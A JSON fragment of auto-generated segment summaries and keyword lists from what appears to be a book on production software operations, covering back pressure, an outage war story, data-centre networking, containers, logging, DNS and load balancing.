    "summary": "Create Back Pressure • 121\n(See Little’s law.3) So as a queue’s length reaches toward infinity, response time also heads toward infinity.\nWe really don’t want unbounded queues in our systems.\nOn the other hand, if the queue is bounded, we have to decide what to do when it’s full and a producer tries to stuff one more thing into it.\nActually accept the new item and drop something else from the queue on\nBlock the producer until there is room in the queue.\nFor some use cases, dropping the item may be the best option.\nFor data whose value decreases rapidly with age, dropping the oldest item in the queue might be the best option.\nIt allows the queue to apply “back pressure” upstream.\nPresumably that back pressure propagates all the way to the ultimate client, who will be throttled down in speed until the queue releases.\nBack pressure from the TCP window can cause the sender to fill up its transmit buffers, in which case subsequent calls to write to the socket will block.\nObviously back pressure can lead to blocked threads.\nThe Back Pressure pattern works best with asynchronous calls and programming.\nBack pressure only helps manage load when the pool of consumers is finite.\nWhen the rate of “create tag” calls exceeds the storage engine’s limit, what happens?\nInstead, we can create back pressure by use of a blocking queue for “create tag” calls.\nLet’s say each API server is allowed 100 simultaneous calls to the storage engine.\nWhen the 101st call arrives at the API server, the calling thread blocks until there is an open slot in the queue.\nThat blocking is the back pressure.\nThe API server cannot make calls any faster than it is allowed.\nIt means that one API server may have blocked threads while another has free slots available.\nWe could make this smarter by letting the API servers make as many calls as they want but put the blocking on the receiver’s end.\nIn that case, our off- the-shelf storage engine must be wrapped with a service to receive calls, measure response times, and adjust its internal queue size to maximize throughput and protect the engine.\nIn our example, the API server should accept calls on one thread pool and then issue the outbound call to storage on another set of threads.\nThat way, when the outbound call blocks, the request-handling thread can time out, unblock, and respond with an HTTP 503.\nA consumer inside your system boundary will experience back pressure as a performance problem or as timeouts.\nGovernor • 123\nBack Pressure creates safety by slowing down consumers.\nApply Back Pressure within a system boundary\nQueues must be finite for response times to be finite.\nWe should use automation for things humans are bad at: repetitive tasks and fast response.\nWe can create governors to slow the rate of actions.\nOutside the range, the governor applies increasing resistance.\nThe whole point of a governor is to slow things down enough for humans to get involved.\nShutting down, deleting, blocking things...these are all likely to interrupt service.\nAutomation will make them go fast, so you should apply a Governor to provide humans with time to intervene.\nIf you ever catch yourself saying, “The odds of that happening are astronomical,” or some similar utterance, consider this: a single small service might do ten million requests per day over three years, for a total of 10,950,000,000 chances for something to go wrong.\nAfter a few hundred years, the official calendar date for the solstice would occur weeks before the actual event.\nThe Gregorian calendar, like most calendars, was created to mark holy days (that is, holidays).\nThese landmarks happen to be marked with specific dates on the Gregorian calendar, but in the minds of florists and their entire extended supply chain, those seasons have their own significance beyond the official calendar date.\nFor retailers, the year begins and ends with the euphemistically named “holiday season.” Here we see a correspondence between various religious calendars and the retail calendar.",
    "keywords": [
      "Back Pressure",
      "Create Back Pressure",
      "Back",
      "Pressure",
      "API server",
      "Back Pressure creates",
      "calendar",
      "queue",
      "Back Pressure pattern",
      "Gregorian calendar",
      "API",
      "calls",
      "Create Back",
      "Apply Back Pressure",
      "back pressure works"
    ],
    "concepts": [
      "calendar",
      "calendars",
      "calls",
      "calling",
      "block",
      "blocking",
      "blocked",
      "blocks",
      "human",
      "pattern"
    ]
  },
  {
    "chapter_number": 18,
    "title": "Segment 18 (pages 139-146)",
    "start_page": 139,
    "end_page": 146,
    "summary": "Bear in mind, we were the local engineering team; the main site operations center (SOC)—a facility staffed with highly skilled engineers twenty-four hours a day—was in another city.\nOur local team was far too small to be on-site twenty-four hours a day all the time, but we worked out a way to do it for the limited span of the Thanksgiving weekend.\nDuring the run-up to the launch, I was part of load testing this new site.\nTo get more information out of the load test, I had started off using the application server’s HTML administration GUI to check vitals like latency, free heap memory, active request-handling threads, and active sessions.\nOn the other hand, if you need to look at thirty or forty servers at a time, the GUI gets downright impractical.\nBecause the entire admin GUI was HTML-based, the application server never knew the difference between a Perl module or a web browser.\nArmed with these Perl modules, I was able to create a set of scripts that would sample all the application servers for their vital stats, print out detail and summary results, sleep a while, and loop.\nThey were simple indicators, but in the time since site launch, all of us had learned the normal rhythm and pulse of the site by watching these stats.\nIf session counts went up or down from the usual envelope, if the count of orders placed just looked wrong, we would know.\nThe session count in the early morning already rivaled peak time of the busiest day in a normal week.\nPage latency, our summary indicator of response time and overall site performance, was clearly stressed but still nominal.\nThis is Daniel from the site operations center,” said Daniel.\nIn an ATG site,1 page requests are handled by instances that do nothing but serve pages.\nThe web server calls the applica- tion server via the Dynamo Request Protocol (DRP), so it’s common to refer to the request- handling instances as DRPs. A red DRP indi- cates that one of those request-handling instances stopped responding to page requests.\n“All DRPs red” meant the site was down, losing orders at a rate of about a million dollars an hour.\nIt takes about ten minutes to bring up all the application servers on a single host.\nYou can do up to four or five hosts at a time, but more than that and the database response time starts to suffer, which makes the start-up process take longer.\nThere’s nothing like trying to sort out fifteen different voices in an echoing conference room, especially when other people keep popping in and out of the call from their desks, announcing such helpful information as, “There’s a problem with the site.” Yes, we know.\nApplication server page latency (response time) was high.\nRequest-handling threads were almost all busy.\nBecause requests were timing out, it was effectively infinite.\nYou can only measure the response time on requests that are done.\nSo whatever your worst response time may be, you can’t measure it until the slowest requests finish.\nOther than the long response time, which we already knew about since SiteScope was failing to complete its synthetic transactions, none of our usual suspects looked guilty.\nTo get more information, I started taking thread dumps of the application servers that were misbehaving.\nWhile I was doing that, I asked Ashok, one of our rock- star engineers who was on-site in the conference room, to check the back- end order management system.\nHe saw similar patterns on the back end as on the front end: low CPU usage and most threads busy for a long time.\nThe thread dumps on the front-end application servers revealed a similar pattern across all the DRPs. A few threads were busy making a call to the back end, and most of the others were waiting for an available connection to call the back end.\nIn short, every single request- handling thread, all 3,000 of them, were tied up doing nothing, perfectly explaining our observation of low CPU usage: all 100 DRPs were idle, waiting forever for an answer that would never come.\nHe explained that of the four servers that normally handle scheduling, two were down for maintenance over the holiday weekend and one of the others was malfunctioning for reasons unknown.\nThe sole scheduling server that remained could handle up to twenty-five concurrent requests before it started to slow down and hang.\nWe estimated that right then the order management system was probably sending it ninety requests.\nHe had gotten paged a few times about the high CPU condition but had not responded, since that group routinely gets paged for transient spikes in CPU usage that turn out to be false alarms.\nThe entire line, with fifteen people in a conference room on speakerphone and a dozen more dialed in from their desks, went silent for the first time in four hours.\nSo, to recap, we have the front-end system, the online store, with 3,000 threads on 100 servers and a radically changed traffic pattern.\nIt’s swamping the order management system, which has 450 threads that are shared between handling requests from the front end and processing orders.\nThe order man- agement system is swamping the scheduling system, which can barely handle twenty-five requests at a time.\nIt quickly became clear that the only answer was to stop making so many requests to check schedule availability.\nWith the weekend’s marketing campaign centered around free home delivery, we knew requests from the users were not about to slow down.\nIn fact, it had a separate connection pool just for scheduling requests.\nThey replied that the code would handle that and present the user with a polite message stating that delivery scheduling was not available for the time being.\nThat DRP started handling requests again!\nOf course, because only one DRP was responding, the load manager started sending every single page request to that one DRP.\nI ran my scripts, this time with the flag that said “all DRPs.” They set max and checkoutBlockTime to zero and then recycled the service.\nIf we had needed to change the configuration files and restart all the servers, it would have taken more than six hours under that level of load.",
    "keywords": [
      "time",
      "threads",
      "order management system",
      "application server",
      "Phenomenal Cosmic Powers",
      "requests",
      "system",
      "application",
      "site",
      "response time",
      "servers",
      "orders",
      "server",
      "Day",
      "call"
    ],
    "concepts": [
      "site",
      "sites",
      "request",
      "requests",
      "orders",
      "order",
      "scheduled",
      "scheduling",
      "schedule",
      "weekends"
    ]
  },
  {
    "chapter_number": 19,
    "title": "Segment 19 (pages 147-156)",
    "start_page": 147,
    "end_page": 156,
    "summary": "They may not be logged in to a beautifully designed front-end application, but they get to interact with your system through its configuration, control, and monitoring interfaces.\nFoundationHardware, VMs, IP addresses, physical network\nOperations leads us into design for production considerations by looking at the physical fundamentals of the sys- tem: the machines and wires that everything else builds upon.\nThe first order of business is to clear up some things about networks, hostnames, and IP addresses.\nAfter that, it’s time to talk about the code holders: physical hosts, virtual machines, and containers.\nNetworking in the Data Center and the Cloud\nNetworking in the data center and the cloud takes more than opening a socket.\nNetworking in the Data Center and the Cloud • 143\nOne of the great misunderstandings in networking is about the hostname of a machine.\nIn other words, a machine may have its FQDN set to “spock.example.com” but have a DNS mapping as “mail.example.com” and “www.example.com.” The fundamental disconnect is that a machine uses its hostname to identify the whole machine, while a DNS name identifies an IP address.\nA single machine may have multiple network interface controllers (NICs.) If you run “ifconfig” on a Linux or Mac machine, or “ipconfig” on a Windows machine, you’ll probably see several NICs listed.\nNearly every server in a data center will be multihomed.\nData center machines are multihomed for different purposes.\nThese networks have different security requirements, and an application that is not aware of the multiple network interfaces will easily end up accepting connections from the wrong networks.\nAs shown in the following figure, this single server has four different network interfaces.\nBecause these are running to differ- ent switches, the server appears to be configured for high availability.\nNetworking in the Data Center and the Cloud • 145\nBonded interfaces that connect to different switches require some additional configuration on the switches, or else routing loops can result.\nTherefore, good network design for the data center partitions the backup traffic onto its own network segment.\nWith backup traffic partitioned off from the production network, application users don’t necessarily suffer when the backups run.\nFinally, many data centers have a specific network for administrative access.\nThis is an important security protection, because services such as SSH can be bound only to the administrative interface and are therefore not accessible from the production network.\nBy default, an application that listens on a socket will listen for connection attempts on any interface.\nTo determine which interfaces to bind to, the application must be told its own name or IP addresses.\nIn development, the server can always call its language-specific version of getLocal- Host(), but on a multihomed machine, this simply returns the IP address associ- ated with the server’s internal hostname.\nTherefore, server applications that need to listen on sockets must add configurable properties to define to which interfaces the server should bind.\nUnder exceedingly rare conditions, an application also has to specify which interface it wants traffic to leave from when connecting to a target IP address.\nFor production systems, I would regard this as a configuration error in the host: it means multiple routes reach the same destination, hooked to different NICs.\nSuppose “en0” and “en1” are connected to different switches, but also bonded as “bond0.” Without any additional guidance, an application opening an outbound connection won’t know which interface to use.\nWith that under our belts, we now have enough networking knowledge to talk about the hosts and the layers of virtualization on them.\nPhysical Hosts, Virtual Machines, and Containers\nA design that works nicely in a physical data center environment may cost too much or fail utterly in a containerized cloud envi- ronment.\nIf anything, development machines tend to be a bit beefier than the average pizza box in the data center these days.\nPhysical Hosts, Virtual Machines, and Containers • 147\nIn fact, your development machine probably has more storage than one of your data center hosts will have.\nThe typical data center host has enough storage to hold a bunch of virtual machine images and offer some fast local persistent space.\nVirtual Machines in the Data Center\nVirtualization promised developers a common hardware appearance across the bewildering array of physical configurations in the data center.\nIt promised data center managers that it would rein in “server sprawl” and pack all those extra web servers running at 5 percent utilization into a high-density, high- utilization, easily managed whole.\nMany virtual machines can reside on the same physical hosts.\n“Guest operating systems” run in the virtual machines.) Physical hosts are usually oversubscribed.\nWhen designing applications to run in virtual machines (meaning pretty much all applications today) you must make sure that they’re not sensitive to the loss or slowdown of any one host.\nVirtual machines make all the problems with clocks much worse.\nIt turns out that’s not even true for a clock on a physical machine.\nBetween two calls to examine the clock, the virtual machine can be suspended for an indefinite span of real time.\nPhysical Hosts, Virtual Machines, and Containers • 149\nContainers in the Data Center\nContainers have invaded the data center, pushed there by developer insistence.\nContainers promise to deliver the process isolation and packaging of a virtual machine together with a developer-friendly build process.\nContainers in the data center act a lot like virtual machines in the cloud (see Virtual Machines in the Cloud, on page 152).\nThe most challenging part of running containers in the data center is definitely the network.\nBy default, a container doesn’t expose any of its ports (on its own virtual interface) on the host machine.\nThis uses virtual LANs (VLANs)—see Virtual LANs for Virtual Machines, on page 150 —to create a virtual network just among the containers.\nThe overlay network has its own IP address space and does its own routing with software switches running on the hosts.\nWithin the overlay network, some control plane software manages the whole ensemble of containers, VLANs, IPs, and names.\nA close second for “hardest problem in container-world” is making sure enough container instances of the right types are on the right machines.\nSolutions for running containers in data centers are emerging.",
    "keywords": [
      "Data Center",
      "virtual machines",
      "data",
      "machine",
      "center",
      "host",
      "machines",
      "Data center machines",
      "network",
      "virtual",
      "physical hosts",
      "data center hosts",
      "hosts",
      "Data Center Containers",
      "application"
    ],
    "concepts": [
      "network",
      "networks",
      "networking",
      "machines",
      "machine",
      "application",
      "applications",
      "containers",
      "container",
      "virtually"
    ]
  },
  {
    "chapter_number": 20,
    "title": "Segment 20 (pages 157-165)",
    "start_page": 157,
    "end_page": 165,
    "summary": "It will be common to see software switches running on the hosts, presenting a complete network environment to the containers that does the following:\nAllows containers to “believe” they’re on isolated networks • Supports load-balancing via virtual IPs • Uses a firewall as a gateway to the external network\nWhile this technology matures, our container systems have to provide their own load- balancing and need to be told which IP addresses and ports their peers are on.\nPhysical Hosts, Virtual Machines, and Containers • 151\nOriginally created by engineers at Heroku, the 12-factor app is a succinct description of a cloud-native, scalable, deployable application.a Even if you’re not running in a cloud, it makes a great checklist for application developers.\nVirtual Machines in the Cloud\nAny individual virtual machine in the cloud has worse availability than any individual physical machine (assuming equally skilled data center engineering and operations).\nA virtual machine in the cloud runs atop a physical host, but with an extra operating system in the middle.\nIf you’ve been running in AWS for any length of time, you’ll have encountered virtual machines that got killed for no apparent reason.\nIf you have long-running virtual machines, you may even have gotten a notice from AWS informing you that the machine has to be restarted (or else!).\nAnother factor that presents a challenge to traditional applications is the ephemeral nature of machine identity.\nA machine ID and its IP address are only there as long as the machine keeps running.\nWhen it comes to network interfaces on those cloud VMs, the default is pretty simple: one NIC with a private IP address.\nIt’s better to set up a single entry point (a “bastion” or “jumphost” server) with strong logging on SSH connections and then use the private network to get from there to other VMs.\nDesigning individual services to run in this kind of deployment is not that much different from designing them to run in containers in the data center.\nMost of the big challenges arise from building those containers into a whole system.\nWill a machine have NICs on different networks with different jobs?\nGiven a stable foundation to build upon, we need to look at how individual machine instances in that environment will behave and how we will control them.\nProcesses on Machines\nIn the last chapter, we looked at a diverse set of network and physical envi- ronments that our software may be deployed into.\nEvery machine needs the right code, configuration, and network connections.\nFor instance, when some people say “server” they might mean a virtual machine running on a physical host in their data center.\nOthers might mean a process inside an operating system, rather than a whole machine image.\nA process in a container is also a process on the operating system that hosts the container.\nA service may have processes from multiple executables (for example, application code plus a database).\nOne service may present a single IP address with load balancing behind the scenes.\nInstance An installation on a single machine (container, virtual, or physical) out of a load-balanced array of the same executable.\nProcesses on Machines • 156\ninstances we refer to processes of the same executable, just running in multiple locations.\nExecutable An artifact that a machine can launch as a process and created by a build process.\nAn operating system process running on a machine; the runtime\nMachines\nThe build process compiles the source code into binary executables that go into the package repository.\nIf the build makes it all the way through the pipeline, the very same tagged binary gets laid down as an installation on each machine.\nIn the runtime view, we’re more concerned with the processes running on the machines.\n(By the way, a lot of architectural confusion stems from attempts to cram both static and dynamic views into the same figure.) Each machine runs an instance of the same binary: our compiled service.\nMachine\nMachine\nMachine\nMachine\nMachine\nMachine\nIf you tell someone to “reboot the server,” you might not know which server they’re about to bounce, and you can’t be sure whether they’re going to kill a single process or the whole machine.1\nEven before we get to questions about containers versus VM images, we should look at some things about the code.\nBuilding the Code\nAs a result, we have great tools at our disposal to build, house, and deploy code.\nProcesses on Machines • 158\nDevelopers should work on code within a version control system.\nDevelopers should not do production builds from their own machines.\nConfiguration management tools like Chef, Puppet, and Ansible are all about applying changes to running machines.",
    "keywords": [
      "Machine Instance Machine",
      "machine",
      "Machines",
      "Virtual Machines",
      "Instance Machine Instance",
      "Machine Machine Instance",
      "containers",
      "Virtual",
      "Machine Instance",
      "Instance Machine",
      "cloud",
      "build",
      "code",
      "container",
      "control"
    ],
    "concepts": [
      "machines",
      "machine",
      "containers",
      "container",
      "contain",
      "networks",
      "network",
      "networking",
      "runs",
      "running"
    ]
  },
  {
    "chapter_number": 21,
    "title": "Segment 21 (pages 166-173)",
    "start_page": 166,
    "end_page": 173,
    "summary": "The configuration management tools put a lot of effort into converging unknown machine states into known machine states, but they aren’t always successful.\nThe DevOps and cloud community say that it’s more reliable to always start from a known base image, apply a fixed set of changes, and then never attempt to patch or update that machine.\nWhen it’s time to deploy new code, we don’t patch up the container; we just build a new one instead.\nConfiguration\nEvery piece of production-class software has scads of configurable properties containing hostnames, port numbers, filesystem locations, ID numbers, magic keys, usernames, passwords, and lottery numbers.\nLet’s look at some design guidelines for handling instance-level configuration.\nConfiguration Files\nThe configuration “starter kit” is a file or set of files the instance reads at startup.\nConfiguration files may be buried deep in the directory structure of\nBecause the same software runs on several instances, some configuration properties should probably vary per machine.\nWe don’t want our instance binaries to change per environment, but we do want their properties to change.\nThat means the code should look outside the deployment directory to find per-environment configurations.\nIn image-based environments like EC2 or a container platform, configuration files can’t change per instance.\nInjecting configuration works by providing environment variables or a text blob.\nTo use the user data, some code in the image must already know how to read and parse it (for example, it might be in properties format, but it might be JSON or YAML, too).\nSo the application code does need some awareness of its targeted deployment environment.\nfor its configuration.\nZooKeeper and etcd—and any other configuration service, for that matter—are complex pieces of distributed systems software.\nTransparency refers to the qualities that allow operators, developers, and business sponsors to gain understanding of the system’s historical trends, present conditions, instantaneous state, and future projections.\nWe’ll see what machine and service instances must do to create transparency.\nLater, in Chapter 10, Control Plane, on page 193, we see how to knit instance-level information with other sources to create system-level transparency.\nGood logging is one example.\nInstances should log their health and events to a plain old text file.\nLogging\nDespite millions of R&D dollars on “enterprise application management” suites and spiffy operations centers with giant plasma monitors showing color-coded network maps, good old log files are still the most reliable, versatile information vehicle.\nIt’s worth a chuckle once in a while to realize that here we are, in the twenty-first century, and log files are still one of our most valuable tools.\nLogging is certainly a white-box technology; it must be integrated pervasively into the source code.\nLog files reflect activity within an application.\nIf you want to avoid tight coupling to a particular monitoring tool or frame- work, then log files are the way to go.\nNothing is more loosely coupled than log files; every framework or tool that exists can scrape log files.\nThis loose coupling means log files are also valuable in development, where you are less likely to find ops tools.\nEven in the face of this value, log files are badly abused.\nLog Locations\nDespite what all those application templates create for us, a logs directory under the application’s install directory is the wrong way to go.\nLog files can be large.\nEven if your instance runs in a VM, it’s still a good idea to separate log files out from application code.\nIf you make the log file locations configurable, then administrators can just set the right property to locate the files.\nIf you don’t make the location config- urable, then they’ll probably relocate the files anyway, but you might not like how it gets done.\nThis involves creating a symbolic link from the logs directory to the actual location of the files.\nLogging Levels\nAs humans read (or even just scan) log files for a new system, they learn what “normal” means for that system.\nSome applications, particularly young ones, are very noisy; they generate a lot of errors in their logs.\nMost developers implement logging as though they are the primary consumer of the log files.\nIn fact, administrators and engineers in operations will spend far more time with these log files than developers will.\nLogging should be aimed at production operations rather than development or testing.",
    "keywords": [
      "log files",
      "Base Image State",
      "configuration",
      "Files",
      "system",
      "Base Image",
      "State",
      "n’t",
      "log",
      "Transparency",
      "Configuration Files",
      "application",
      "Image State",
      "machine states",
      "Image"
    ],
    "concepts": [
      "logging",
      "log",
      "logs",
      "logged",
      "configuration",
      "configurations",
      "instance",
      "instances",
      "transparency",
      "transparent"
    ]
  },
  {
    "chapter_number": 22,
    "title": "Segment 22 (pages 174-181)",
    "start_page": 174,
    "end_page": 181,
    "summary": "It’s something that should not happen under normal circumstances, and it probably means action is required on the other end of the connection.\nIt’s easy to leave debug messages turned on in production.\nAbove all else, log files are human-readable.\nTherefore, it behooves us to ensure that log files convey clear, accurate, and actionable information to the humans who read them.\nIf log files are a human interface, then they should also be written such that humans can recognize and interpret them as rapidly as possible.\nOn seeing the message, she immediately logged into the production server and started a database failover.\nIt was a debug message (see Debug Logs in Production, on page 167) informing me that an encrypted channel to an outside vendor had been up and running long enough that the encryption key would soon be vulnerable to discovery, just because of the amount of encrypted data that the channel served.\nThat “Reset required” message was the last thing logged before the database went down.\nWhen it’s time to read ten thousand lines of a log file (after an outage, for example), having a string to grep will save tons of time.\nInstance Metrics\nFor quicker, easier summary information we can create a health check as part of the instance itself.\nThe health check is an important part of traffic management, which we’ll examine further in Chapter 9, Interconnect, on page 171.\nClients of the instance shouldn’t look at the health check directly; they should be using a load bal- ancer to reach the service.\nWhen the health check on a new instance goes from failing to passing, it means the app is done with its startup.\nIf we do a good job of building code to run in instances, then we can make a solid large-scale structure.\nThat means instances should be designed for production.\nNow we need to look at how we can connect instances together into a whole system.\nIn the previous chapter, we looked at instances running on machines.\nThis chapter continues our iterative zoom-out to look at how the instances work together and find each other, as well as how callers invoke them.\nAs with the instance level, we also need to create transparency and control.\nFor instance, some techniques for service discovery and invocation depend on extra pieces of software.\nA large team or department with hundreds of small services would do well to use Consul or another dynamic discovery service.\nFor one thing, it can deal with a high rate of change in both the services included and in the location of the instances in those services.\n(Or maybe we should say “service area”?) That’s probably acceptable to the large company because a dedicated operations team and even a “platform” or “ecosystem” team probably run such tools.\nIt would be unrealistic to believe that service consumers could stay up-to-date with IP address changes in their providers, especially in a highly virtualized, cloud, or container infrastructure.\nSo as we look at the solutions in the rest of this chapter, it will be helpful to consider each in terms of the rate of change or dynamism it supports, how much operational support it requires, and how much global knowledge it requires.\nIn these environments, IP addresses will remain stable enough for DNS to be useful.\nService Discovery with DNS\nWhen you use DNS to call another service, discovery is more Sherlock Holmes than Siri.\nYour team needs to find the service owners and pry the DNS name or names out of them.\nWhen a client calls a service, the provider of that service may only have a single DNS name.\nWhen using DNS, it’s important to have a logical service name to call, rather than a physical hostname.\nAn alias only needs to be changed in one place (the name server’s database) rather than in every consuming application.\nLoad Balancing with DNS\nIt operates at the application layer (layer 7) of the OSI stack; but instead of operating during a service request, it operates during address resolution.\nDNS round-robin simply associates several IP addresses with the service name.\nSince the client connects directly to one of the servers, there’s no opportunity to redirect that traffic if one particular instance is down.\nThe DNS server has no information about the health of the instances, so it can keep vending out IP addresses for instances that are toast.\nFurther- more, doling out IP addresses in round-robin style does not guarantee that the load is distributed evenly, just the initial connections.\nAgain, when one of the instances gets busy, the DNS server has no way to know, so it just keeps sending every eleventh connection (or whatever) to the staggering instance.\nDNS round-robin load balancing is also inappropriate whenever the calling system is a long-running enterprise system.\nAnything using Java’s built-in classes will cache the first IP address it receives from DNS, guaranteeing that every future connection targets the same instance and completely defeating load balancing.",
    "keywords": [
      "DNS",
      "service",
      "Instance",
      "Instances",
      "health check",
      "DNS DNS round-robin",
      "health",
      "DNS round-robin",
      "message",
      "report erratum",
      "DNS DNS",
      "system",
      "service discovery",
      "DNS round-robin load",
      "load balancing"
    ],
    "concepts": [
      "instance",
      "instances",
      "services",
      "service",
      "connection",
      "connect",
      "connects",
      "connections",
      "operators",
      "operations"
    ]
  },
  {
    "chapter_number": 23,
    "title": "Segment 23 (pages 182-191)",
    "start_page": 182,
    "end_page": 191,
    "summary": "Global Server Load Balancing with DNS\nDNS has enough limitations when it comes to load balancing across instances that it’s usually worth moving up the stack a bit.\nHowever, there’s one place where DNS excels: global server load balancing (GSLB).\nLocal Load Balancer\nLocal Load Balancer\nEach location has one or more pools of load-balanced instances for the ser- vice, as shown in the previous illustration.\nEach pool has an IP address that goes to the load balancer.\n(See Migratory Virtual IP Addresses, on page 189, for load balancing with virtual IPs.) The job of GSLB is just to get the request to the virtual IP address for a particular pool.\nIf the pool is offline, or doesn’t have any healthy instance to serve the request, the GSLB server won’t even give out the IP address of the pool.\n4. The client now connects directly to 184.72.248.171, which is served by the load balancer.\nThe load balancer directs traffic to the instances just as it normally would.\nThe load balancer (sometimes called a “local traffic manager”) operates as a reverse proxy so the actual call and response pass through it.\nLoad Balancing • 177\nDNS round-robin offers a low-cost way to load-balance.\nload balancers.\nLoad Balancing\nLoad balancing is all about distributing requests across a pool of instances to serve all requests correctly in the shortest feasible time.\nIn the previous section we looked at DNS round-robin as a means of load balancing.\nIn this section we will consider active load balancing.\nLoad Balancer\nAll types of active load balancers listen on one or more sockets across one or more IP addresses.\nThese IP addresses are commonly called “virtual IPs” or “VIPs.” A single physical network port on a load balancer may have dozens of VIPs bound to it, as shown above.\nThe load-balancing algorithm to use • What health checks to perform on the instances • What kind of stickiness, if any, to apply to client sessions • What to do with incoming requests when no pool members are available\nTo a calling application, the load balancer should be transparent.\nIf the client can tell there’s a load balancer involved, it’s probably broken.\nThe service provider instances sitting behind the proxy server need to generate URLs with the DNS name of the VIP rather than their own hostnames.\nLoad balancers can be implemented in software or with hardware.\nLet’s dig into the software load balancers first.\nSoftware Load Balancing\nSoftware load balancing is the low-cost approach.\nLoad Balancing • 179\nSquid,1 HAProxy,2 Apache httpd,3 and nginx4 all make great reverse proxy load balancers.\nIn addition to load balancing, you can configure reverse proxy servers to reduce the load on the service instances by caching responses.\nOnce you start contemplating a layer of load balancing in front of your reverse proxy servers, it’s time to look at other options.\nHardware Load Balancing\nHardware load balancers are specialized network devices that serve a similar role to the reverse proxy server.\nBecause they operate closer to the network, hardware load balancers provide better capacity and throughput, as illustrated in the following figure.\nHardware load balancers are application-aware and can provide switching at layers 4 through 7 of the OSI stack.\nI’ve seen these successfully employed to load-balance a group of search servers that didn’t have their own load managers.\nThis works well in conjunction with global server load balancing (see Global Server Load Balancing with DNS, on page 175).\nOne of the most important services a load balancer can provide is service health checks.\nThe load balancer will not send traffic to an instance that fails a certain number of health checks.\nLoad Balancing • 181\nLoad balancers can also attempt to direct repeated requests to the same instance.\nOne common approach has the load balancer attach a cookie to the outgoing response to the first request.\nThis approach will break badly if you have a reverse-proxy upstream of the load balancer.\nAnother useful way to employ load balancers is “content-based routing.” This approach uses something in the URLs of incoming requests to route traffic to one pool or another.\nOf course, something in the requests must be evident to the load balancer.\nLoad balancers are integral to the delivery of your service.\nLoad balancing plays a part in availability, resilience, and scaling.\nBecause so many application attributes depend on them, it pays to incorporate load- balancing design as you build services and plan deployment.\nmanages, then you might even think about implementing a layer of software load balancing under your control, entirely behind the hardware load balancers in the network.\nLoad balancing creates “virtual IPs” that map to pools of instances.\nSoftware load balancers work at the application layer.\nHealth checks are a vital part of load balancer configuration.\nConsider content-aware load balancing if your service can process work-\nIt’s natural to expect your service to slow down under heavy load, but that means fewer and fewer sockets are available to receive requests exactly when the most requests are coming in!\nlisten queue and persistent load on its sockets and NICs. Under high load those resources are held longer, which further extends response times for the new incoming work.\nA good health check on the first tier of services can inform the load balancer when response times are too high (in other words, higher than the service’s SLA).\nThe load balancer also needs to be configured to send back an HTTP 503 response code when all instances fail their health checks.",
    "keywords": [
      "Load Balancing",
      "Load",
      "Load Balancer",
      "Server Load Balancing",
      "Hardware load balancers",
      "Global Server Load",
      "DNS",
      "Software Load Balancing",
      "Server Load",
      "Balancing",
      "Server",
      "DNS DNS",
      "requests",
      "Local Load Balancer",
      "Hardware Load"
    ],
    "concepts": [
      "load",
      "request",
      "requests",
      "balancing",
      "balancer",
      "balance",
      "balancers",
      "server",
      "servers",
      "service"
    ]
  },
  {
    "chapter_number": 24,
    "title": "Segment 24 (pages 192-199)",
    "start_page": 192,
    "end_page": 199,
    "summary": "Because clients retry TCP connections, it can also be useful to run a “listen queue purge” when the service can’t keep up with demand.\nServices that only deal with work inside a data center can set a very low TIME_WAIT to free up those ephemeral sockets.\nWe have no control over the traffic patterns and mercurial behavior of that population, so our services need to protect themselves when the load gets too heavy.\nFor example, it’s relatively common to see a machine with a front-end network interface connected to one VLAN for communication to the web servers and a back-end network interface connected to a different VLAN for communication to the database servers.\nIn this case, the server must be told which interface to use in order to reach a particular destination IP address.\nIn the case of nearby servers, the routes are probably easy; they’ll just be based on the subnet addresses.\nWhen a machine brings up its primary NIC (whichever one it happens to think is primary, anyway), it uses the main IP address for that NIC as its “default gateway.” That becomes the first entry in the routing table for the host.\nThat table tells the operating system which NIC to use to reach a destination address or network.\nWhen an application sends a packet, the host checks the destination IP address against the routing table to see if it knows how to move that packet a hop closer to its destination.\nDepending on a ton of configuration options that are outside your control, both the VPN and the primary switch may advertise routes that could reach the destination address.\nWorse still, your service will appear to be working normally so you won’t even know it’s happening.\nContainers and VMs use virtual IP addresses, VLAN tagging, and virtual switches to create a kind of “network on a network.” The packets still run over the same wires, but the host machine’s IP address is not involved.\nThey can assign IPs from private pools, attach DNS names to those IPs to identify services, and dynamically create firewalls and subnets.\nFirst, it’s a way that instances of a service can announce themselves to begin receiving a load.\nA caller needs to know at least one IP address to contact for a particular service.\nThe lookup process can appear to be a simple DNS resolution for the caller, even if some super-dynamic service-aware server is supplying the DNS service.\nIt’s best not to roll your own service discovery.\nYou can build a service discovery mechanism on top of a distributed data store such as Apache ZooKeeper or etcd.8,9 In these cases, you’ll wrap the low-level access with a library to make it both easier and more reliable to use these databases.\nMigratory Virtual IP Addresses • 189\nSome other service discovery tools integrate directly with the control plane of PaaS platforms.\nFor example, when Docker Swarm starts containers to run service instances, it automatically registers them with the swarm’s dynamic DNS and load-balancing mechanism.\nMigratory Virtual IP Addresses\nIt also takes over the virtual IP address assigned to the clustered network interface.\nCluster servers use it to migrate ownership of the address between the members of the cluster.\nLoad balancers use virtual IPs to multiplex many services (each with its own IP address) onto a smaller number of physical interfaces.\nThere’s some overlap here, since load balancers typically come in pairs, so the virtual IP (as in “service address”) can also be a virtual IP (as in “migrating address”).\nThis kind of virtual IP address is just an IP address that can be moved from one NIC to another as needed.\nAt any given time, exactly one server claims the IP address.\nWhen the address needs to be moved, the cluster server and the operating systems collaborate to do some funny stuff in the lower layers of the TCP/IP stack.\nThey associate the IP address with a new MAC address (hardware address) and advertise the new route (ARP).\nThe following figure depicts a virtual IP address before and after the active node fails.\nThis kind of migratory IP address is often used for active/passive database clusters.\nClients connect only using the DNS name for the virtual IP address, not to the hostnames of either node in the cluster.\nThat way, no matter which node currently holds the IP address, the client can connect to the same name.\nTherefore, any application calling a database through a virtual IP should be prepared to get a SQLException when such a failover occurs.\nIn general, if your application calls any other service through a handoff virtual IP, it must be prepared for the possibility that the next TCP packet isn’t going to the same interface as the last packet.\nLoad balancing, routing, load shedding, and service discovery are some of the key issues to consider when building this layer.\nIn the preceding chapters we worked our way up from bare metal through layers of abstraction and virtualization to create a sea of instances running on machines.\nThe control plane encompasses all the software and services that run in the background to make production load successful.\nIn a more palatable example, you don’t need IP management software if you’re running a static network on physical hardware.",
    "keywords": [
      "address",
      "service",
      "server",
      "Network",
      "service discovery",
      "time",
      "virtual",
      "network interface",
      "Services",
      "control plane",
      "Control",
      "load",
      "Routing",
      "report erratum",
      "n’t"
    ],
    "concepts": [
      "routing",
      "routes",
      "route",
      "server",
      "servers",
      "network",
      "networking",
      "service",
      "services",
